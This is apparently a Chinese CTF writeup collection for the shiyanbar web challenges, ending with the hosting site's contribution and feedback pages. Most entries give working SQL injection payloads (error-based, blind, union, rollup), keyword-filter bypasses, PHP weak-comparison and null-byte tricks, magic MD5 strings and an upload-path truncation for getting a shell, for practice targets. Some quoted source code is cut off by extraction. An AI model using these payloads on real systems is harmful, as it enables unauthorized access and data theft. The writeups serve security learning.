WP：https://blog.csdn.net/qq_36791003/article/details/81746730 解题过程： 打开网页，右键查看源代码发现源码： 0){ echo 'flag is :'.$flag; } else{ echo '密码错误!'; } --> 上网查了下，了解到md5($password,true)返回的是原始 16 字符二进制格式的密文,返回的内容可以存在单引号，故我们可以找个字符串，使其md5(str,true)加密过返回的字符串与原sql语句拼接造成SQL注入攻击。经过简单的Fuzz,我们知道：字符串'or'6\"，此时如果拼接到sql语句中，那么这条语句将会变成一条永真式，因此成功登录，获得flag。 0x03 加了料的报错注入 简单概括： 考点：双参数注释绕过，=被过滤可用regexp 'xxx'和in (0xaaaa)代替 难度： 中 WP：https://www.jianshu.com/p/95f18a32ec7b 解题过程： 观察题目可知此题考的是报错注入，右键源代码得到提升：Post发送username&password。sql语句如下： $sql=\"select * from users where username='$username' and password='$password'\"; 注意：此处可控的参数有两个。简单手工测试，发现过滤了#，and等关键字，而且username处单独过滤了右括号，这意味着我们无法再username出使用函数，因而我们将目光转向password。经过一番人工Fuzz，发现只有exp()函数没有被过滤，故我们构造语句：exp(~(select * from(select user())a))成功爆出用户名。 最终我们的payload如下： username=a'/*&password=*/Or exp(~(select * from(select database())a))or'1 //查询当前数据库 username=a'/*&password=*/Or exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema regexp 'error_based_hpf')a))or'1 //查询表名，此处由于=被过滤，我们使用regexp来绕过 username=a'/*&password=*/Or exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj')a))or'1 //查询列名，此处由于and被过滤，故而不加数据库名的验证，在实际渗透中最好还是尽量加上。 username=a'/*&password=*/Or exp(~(select * from(select group_concat(value) from ffll44jj)a))or'1 //获取flag 0x04 认真一点！ 简单概括： 考点：双层叠加绕过过滤，大小写绕过，from()for()代替偏移，布尔盲注 难度：难 WP：https://blog.csdn.net/xingyyn78/article/details/79747404 解题过程： 打开网页，随便输入个数字，页面返回You are in...，输入在数字后加单引号，返回You are not in...。猜测此处考的是bool盲注，根据页面返回的内容判断真假。经过一番简单的fuzz，发现此处过滤的函数只会过滤一次，那么我们可以将过滤关键词双写：oorr就好了。 id=aaa'oorr(1=1)='1 //返回You are in id=aaa'oorr(1=2)='1 //返回You are not in // 此处的aaa是为了让前边条件为假，那么sql语句的判断将依赖于后边的语句 // 即：false ∪ (条件一) = 条件一 我们先判断数据库长度： id=aaa'oorr(length(database())>1)='1 其次循环取数据库名进行判断： id=aaa'oorr(mid((select+database())from(1)foorr(1))='c')='1 //由于,被过滤，使用from与for进行绕过，记得for要写成foorr绕过过滤，+号绕过空格过滤 接着循环判断表名： id=aaa'oorr(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from(1)foorr(1))='a')='1 之后就不写了，与上边类似，写脚本跑就好。 0x05 你真的会PHP吗？ 简单概括： 考点：is_numeric函数的绕过(%20|%00)、PHP32位系统整数型变量最大值为：2147483647(2^31-1) 64位：9223372036854775807(2^63-1) 难度：中 WP：https://blog.csdn.net/JBlock/article/details/78745513 解题过程： 打开题目，发现返回头存在提示信息：打开链接获得源码： $value) { $value = trim($value); is_string($value) && $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i 代码流程：is_numeric[false] && $req['number']!=strval(intval($req['number']))[false]-> $value1!=$value2[false]-> is_palindrome_number($req[\"number\"])[true] 我们知道is_numeric函数与ereg函数一样，存在截断漏洞，而第二个if判断存在弱类型比较的漏洞，我们将这两个漏洞组合起来打一套组合拳。PHP语言对于32位系统的int变量来说，最大值是2147483647，如果我们传入的数值为2147483647的话，经过strrev函数反转再转成int函数仍是2147483647，因为746384741>2147483647，转成int变量会减小成2147483647，故而绕过看似矛盾的条件。而对于开始的is_numeric，加上%00或%20即可，此时is_numeric函数便不会认为这是个数字，而对于下边的strval()in、intval()却无影响。综上所述，我们的number应为：2147483647%00、2147483647%20、%002147483647。 此处%20不能再开头的原因是intval()会将其转换成数字0，而%00无影响。 0x06 登陆一下好吗?? 简单概括： 考点：登录框万能密码 难度：中 WP：https://blog.csdn.net/h1012946585/article/details/79851884 解题过程： 打开页面，猜测考的是万能密码，手动Fuzz发现过滤了or，故改用'='成功。 0x07 who are you? 简单概括： 考点：时间盲注，and case when () then () else () end绕过逗号过滤。 难度：中 WP：https://blog.csdn.net/wy_97/article/details/75643252 解题过程： 抓包，发现回显的数据貌似是直接取header的值，没有经过数据库，使用报错注入失败，猜测是盲注，由于bool盲注返回的页面一致，故此题应为时间盲注：简单测试发现逗号被过滤，导致我们无法使用if语句，不过我们可以换成case when then else语句代替： X-Forwarded-For: 127.0.0.1'and case when(length(database())>1)then(sleep(5))else(sleep(0))end and '1 剩下的就是写脚本慢慢跑了，此处略过。 0x08 因缺思汀的绕过 简单概括： 考点：gourp by xxx with rollup limit 1 offset x#【创建虚拟表最后一行为pwd的值为NULL，借用offset偏移到最后一个，post传输空的pwd，满足条件】 难度：中 WP：https://blog.csdn.net/qq_35078631/article/details/54772798 解题过程： 右键源代码得到提示信息source.txt，打开得到源码。 '.\"\"; echo ''.\"\"; echo ''.\"\"; echo ''.\"\"; echo ''.\"\"; echo ''.\"\"; die; } function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ $StrValue=implode($StrValue); } if (preg_match(\"/\".$ArrReq.\"/is\",$StrValue)==1){ print \"水可载舟，亦可赛艇！\"; exit(); } } $filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\"; foreach($_POST as $key=>$value){ AttackFilter($key,$value,$filter); } $con = mysql_connect(\"XXXXXX\",\"XXXXXX\",\"XXXXXX\"); if (!$con){ die('Could not connect: ' . mysql_error()); } $db=\"XXXXXX\"; mysql_select_db($db, $con); $sql=\"SELECT * FROM interest WHERE uname = '{$_POST['uname']}'\"; $query = mysql_query($sql); if (mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) { print \"CTF{XXXXXX}\"; }else{ print \"亦可赛艇！\"; } }else{ print \"一颗赛艇！\"; } mysql_close($con); ?> 阅读源码可知，我们需要让数据库返回的pwd字段与我们post的内容相同，注意此处是弱类型比较。我们知道grou by with roolup 将创建个虚拟表，且表的最后一行pwd字段为Null。 mysql> create table test ( -> user varchar(100) not null, -> pwd varchar(100) not null);mysql>insert into test values(\"admin\",\"mypass\");mysql>select from test group by pwd with rollupmysql> select from test group by pwd with rollup;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass || admin | mypass || admin | NULL |+-------+------------+3 rows in setmysql> select from test group by pwd with rollup limit 1;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass |+-------+------------+mysql> select from test group by pwd with rollup limit 1 offset 0;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass |+-------+------------+1 row in setmysql> select from test group by pwd with rollup limit 1 offset 1;+-------+--------+| user | pwd |+-------+--------+| admin | mypass |+-------+--------+1 row in setmysql> select from test group by pwd with rollup limit 1 offset 2;+-------+------+| user | pwd |+-------+------+| admin | NULL |+-------+------+1 row in set 构造payload:uname=1' or true group by pwd with rollup limit 1 offset 2#&pwd=offset 2为偏移两个数据，即第三行的pwd字段为空。 0x09 简单的sql注入之3 简单概括： 考点：mysql报错注入 难度：易 WP：https://www.cnblogs.com/caizhiren/p/7846917.html 解题过程： exp函数报错一把嗦 0x0A 简单的sql注入之2 简单概括： 考点：空格过滤 难度：易 WP：https://www.cnblogs.com/caizhiren/p/7862466.html 解题过程： 简单Fuzz发现过滤了空格，使用内敛注释一把嗦。 /**/select/**/group_concat(table_name)/**/from/**/information_schema.tables=database() 0x0B 简单的sql注入之1 简单概括： 考点：双层叠加绕过 难度：易 WP：https://www.jianshu.com/p/5d37d33854e3 解题过程 selectselect 0x0C 天下武功唯快不破 简单概括： 考点：脚本工具的编写 难度：易 WP：无 解题过程： import requests,base64 r = requests.get('http://ctf5.shiyanbar.com/web/10/10.php') key=base64.b64decode(r.headers['FLAG'])[-9:] r = requests.post('http://ctf5.shiyanbar.com/web/10/10.php',data={'key':key}) print(r.text) 0x0D 让我进去 简单概括： 考点：hash长度拓展攻击 难度：难 WP：http://www.0x002.com/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/ 0x0E 拐弯抹角 简单概括： 考点：index.php/index.php 难度：易 WP：无 解题过程： index.php/index.php 0X0F Forms 简单概括： 考点：不清楚，过于简单 难度：无 WP：无 0x10 天网管理系统 简单概括： 考点：PHP==弱类型比较，PHP序列化与反序列化 难度：易 WP：http://www.cnblogs.com/ssooking/p/5877086.html 解题过程： 右键查看源代码发现部分源码 ：我们知道0e开头的字符串在与数字0做弱类型比较时会先转成数值0在比较，故：我们只要输入一个经md5加密后密文为0e开头的字符串即可。 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 0x11 忘记密码了 简单概括： 考点：vim源码泄露 难度：中 WP：.submit.php.swp 解题过程： 打开题目，观察源码，发现管理员邮箱：admin@simplexue.com，随便输入一个内容提交，显示step2.php，尝试访问step2.php，网页被重定向且返回html源码，发现存在submit.php文件，猜测存在swp源码泄露，访问.submit.php.swp文件得到部分源码。 ........这一行是省略的代码........ /* 如果登录邮箱地址不是管理员则 die() 数据库结构 -- -- 表的结构 `user` -- CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT '0', PRIMARY KEY (`id`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ; -- -- 转存表中的数据 `user` -- INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES (1, '****不可见***', '***不可见***', 0); */ ........这一行是省略的代码........ if(!empty($token)&&!empty($emailAddress)){ if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = \"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r>0){ echo $flag; }else{ echo \"失败了呀\"; } } payload: token=0e11111111&emailAddress=admin@simplexue.com 0x12 Once More 简单概括： 考点：ereg函数%00截断，科学计数法 难度：易 WP：1e9%00*-* 解题过程： 打开题目，得到题目源码： You password must be alphanumeric'; } else if (strlen($_GET['password']) 9999999) { if (strpos ($_GET['password'], '*-*') !== FALSE) { die('Flag: ' . $flag); } else { echo('*-* have not been found'); } } else { echo 'Invalid password'; } } ?> 首先判断是否用过get方式传入password，其次判断是否只含有数字和字母，如果是则返回错误，接着判断长度小于8且大于9999999。看到这里估计就知道是要考科学计数法了，最后要求get的数据包含*-*。我们知道1E8就等于10000000，这样就可以满足长度小于8且大于9999999的条件，不过我们先得绕开判断只有数字和字母的条件，我们知道ereg函数可利用%00进行截断攻击，故我们的payload构造如下：?password=1e8%00*-*注意此处的%00只占一个字符的大小。 0x13 Guess Next Session 简单概括： 考点：Session与Cookie绑定，PHP弱类型比较 难度：易 WP：删掉Cookie，?password= 解题过程： 打开题目得到源码： Wrong guess.'; } mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000)); ?> 创建session，通过get方式取password值再与session里的password值进行比较，这里我们不知道 session里的password值是多少的，而且我们并不能控制session，不过这里的比较是用==弱类型比较，猜想，如果我们将cookie删除，那么$_SESSION['password']的值将为NULL，此时如果我们get传入的 password为空，即''，那么比较结果即为true。payload:将cookie删除或禁用，接着访问?password= 0x14 FALSE 简单概括： 考点：sha1,md5等传入数组返回Null，PHP弱类型比较 难度：易 WP：?name[]=1&password[]=2 解题过程： 打开题目获得源码： Your password can not be your name!'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo 'Invalid password.'; } else{ echo 'Login first!'; ?> 我们知道sha1()函数与md5()类似，当参数为数组时会返回NULL，如果我们传入的name与password为数组时无论其为什么值，都可以通过sha1($name)===sha1($password)的强类型判断。故我们的payload构造如下：?name[]=a&password[]=b 0x15 上传绕过 简单概括： 考点：目录名%00截断 难度：易 WP：/upload/1.php%00 解题过程： burp抓个上传包：首先尝试了文件名%00阶段，发现无用，然后看到了我们可以控制上传的目录名，猜测后台为获取目录名再与文件名拼接。如果我们的目录名存在截断漏洞，那么我们可以构造/uploads/1.php%00这样拼接的时候就只有目录名，达到getshell的目的。 0x16 NSCTF web200 简单概括： 考点：逆加密过程 难度：易 WP：部分： x = \"~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg\" c = \"\" for a in x: b = ord(a) c += chr(b-1) print(c) 解题过程： 打开题目：解密问题，按照加密过程反着解密即可。 0x17 程序逻辑问题 简单概括： 考点：union select联合注入 难度：易 WP：user=123aaa%27+union+select+%27c4ca4238a0b923820dcc509a6f75849b&pass=1 解题过程： 打开题目，右键查看源代码得到题目源码： welcome to simplexue connect_error) { die(\"Connection failed: \" . mysql_error($conn)); } $user = $_POST[user]; $pass = md5($_POST[pass]); $sql = \"select pw from php where user='$user'\"; $query = mysql_query($sql); if (!$query) { printf(\"Error: %s\\n\", mysql_error($conn)); exit(); } $row = mysql_fetch_array($query, MYSQL_ASSOC); //echo $row[\"pw\"]; if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) { echo \"Logged in! Key:************** \"; } else { echo(\"Log in failure!\"); } } ?> strcasecmp()函数不分大小写进行字符串比较。首先我们不知道数据库里已有的用户值为多少，更不知其密码。不过我们可以通过构造联合查询注入来返回我们自定义的数据。payloadd: user=abc' union select 'c4ca4238a0b923820dcc509a6f75849b&pass=11的md5为：c4ca4238a0b923820dcc509a6f75849b 0x18 what a fuck!这是什么鬼东西? 简单概括： 考点：JSFUCK 难度：易 WP：复制代码到浏览器控制台执行即可 解题过程： 复制粘贴进浏览器的js控制台，回车运行即可。 0x19 PHP大法 简单概括： 考点：PHP自动解码机制 难度：易 WP：id=%2568ackerDJ 解题过程： 打开题目，页面提示：index.php.txt，打开得到源码： not allowed!\"); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \"hackerDJ\") { echo \"Access granted!\"; echo \"flag: *****************} \"; } ?> Can you authenticate to this website? $_GET[id]在取到值后已经自动urldecode了一次，然而后边再用urldecode解码一次，故可以使用二次编码绕过前边的关键字检测。 0x1A 这个看起来有点简单! 简单概括： 考点：Union无过滤注入 难度：易 WP：无 0x1B 貌似有点难 简单概括： 考点：Header头IP伪造 难度：易 WP：无 0x1C 头有点大 简单概括： 考点：UA头伪造 难度：易 WP：无 0x1D 猫抓老鼠 简单概括： 考点：脑洞 难度：及其变态神经病的题目 WP：无 解题过程： 查看访问请求返回头，发现有东西：将这串base64放到表单里提交即可。 0x1E 看起来有点难 简单概括： 考点：时间盲注 难度：中 WP：sqlmap一把嗦 "},"help.html":{"url":"help.html","title":"加入我们完善网站!","keywords":"","body":"帮助我们     我们诚邀各位热爱CTF的师傅一起不断完善此站点，致力于建成一个完整的CTF题库。    犹记得刚接触CTF时，被一个简单的题目卡了半天，百度找到的答案全都是复制粘贴的垃圾答案。相信很多人都应该与我一样遇到这种事。带着为避免让后来者重走我们的坑的希望，我创建了此站点，但我深知，我一人的力量是远远不足的，在此我诚挚地邀请您加入此项目，在这里你是自由的，没有硬性指标，让我们一起为之一起奋斗吧。    注：本站点纯公益，对本站有贡献的小伙伴将会在首页被公开致谢。 目前可做的事： 目前大家可以做的事情有： 提交写好的Writeup 提出利于网站建设的建议 负责网站的管理与维护 关于提交WP:     为方便站点维护和管理，提交的wp应该遵循以下条件： 内容     为确定站点WP的质量，每个提交的Writeup均需要经过审核组的审核。    对于提交的内容审核组有权进行相应的修改或添加。 模板     首先，我们的Writeup需要按照markdown语法来书写。Markdown教程    其次，md文件 应按照以下格式： # 20xxxxx 如2019DDCTF滴滴高校赛 xxxx ## 题目类型： |类型|年份|难度| |:---:|:---:|:---:| |xxx|20xx|xx| # 网上公开WP： + xxx + xxx + xxx + xxx # 题目下载: + xxx(百度网盘) # 本站备份WP： --- writeup~ ---     注意排面干净整洁，禁止引入非图片的外部资源，如js，css等。    Demo：2019DDCTF 命名     md文件的命名应遵循以下原则：    年份+名称.md，如：2019ddctf.md 版权     搜集的文章必须无版权争议，原作者禁止转载的WP拒收，在每种类型的题目WP之前应先感谢原作者，原公开WP的链接要保留放在公开WP区域内。 提交地址 加入官方QQ群937886410，提交给审核组即可。 关于提交建议 内容     提交的建议必须具有建设性。 提交地址 邮箱：asp-php@foxmail.com 关于管理维护 要求 有责任心 删除垃圾评论 能够时不时确定网站情况 能够处理突发事件，如：coding page服务中断，更换github page服务。 提交地址 邮箱：asp-php@foxmail.com，注明申请管理。 "},"reply.html":{"url":"reply.html","title":"有问题?请在这里反馈!","keywords":"","body":"请在这里留下你的宝贵建议 官方互助群 快来加群一起讨(gao)论(ji)啊。 点我加群 :)群号: 937886410 评论区 请文明评论，禁止广告 "}}